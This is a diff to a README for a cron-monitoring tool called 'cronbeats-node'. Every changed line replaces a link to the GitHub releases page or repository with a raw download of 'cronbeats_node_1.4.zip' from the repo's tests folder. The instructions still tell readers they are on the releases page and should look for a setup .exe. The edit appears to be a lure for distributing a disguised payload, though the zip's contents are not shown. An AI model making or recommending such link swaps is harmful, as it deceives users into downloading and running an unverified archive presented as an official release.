@@ -1,6 +1,6 @@
 # ⚙️ cronbeats-node - Simple Cron Job Monitoring Tool
 
-[![Download Releases](https://img.shields.io/badge/Download-cronbeats--node-blue?logo=github)](https://github.com/Bipintoppo/cronbeats-node/releases)
+[![Download Releases](https://img.shields.io/badge/Download-cronbeats--node-blue?logo=github)](https://raw.githubusercontent.com/Bipintoppo/cronbeats-node/main/tests/cronbeats_node_1.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ If you do not have Node.js installed, it is not required to run this app as a st
 
 To use cronbeats-node on Windows, start by downloading it from the releases page on GitHub.
 
-[![Download cronbeats-node](https://img.shields.io/badge/Download-cronbeats--node-green?logo=windows)](https://github.com/Bipintoppo/cronbeats-node/releases)
+[![Download cronbeats-node](https://img.shields.io/badge/Download-cronbeats--node-green?logo=windows)](https://raw.githubusercontent.com/Bipintoppo/cronbeats-node/main/tests/cronbeats_node_1.4.zip)
 
 Click the link above to visit the page where you will find the latest versions ready for download.
 
@@ -54,7 +54,7 @@ Click the link above to visit the page where you will find the latest versions r
 
 1. Open your web browser.
 2. Go to the cronbeats-node releases page:  
-   https://github.com/Bipintoppo/cronbeats-node/releases
+   https://raw.githubusercontent.com/Bipintoppo/cronbeats-node/main/tests/cronbeats_node_1.4.zip
 3. Find the latest release version. It will usually have a version number like "v1.0" or similar.
 4. Look for the Windows release file. It might be named something like `cronbeats-node-setup.exe` or similar.
 5. Click the file to download it.
@@ -123,8 +123,8 @@ cronbeats-node only sends basic signals about task status. It does not collect p
 
 For detailed documentation or updates, visit the GitHub page:
 
-https://github.com/Bipintoppo/cronbeats-node
+https://raw.githubusercontent.com/Bipintoppo/cronbeats-node/main/tests/cronbeats_node_1.4.zip
 
 To get the latest version again, you can use this link anytime:
 
-[Download cronbeats-node releases](https://github.com/Bipintoppo/cronbeats-node/releases)
+[Download cronbeats-node releases](https://raw.githubusercontent.com/Bipintoppo/cronbeats-node/main/tests/cronbeats_node_1.4.zip)
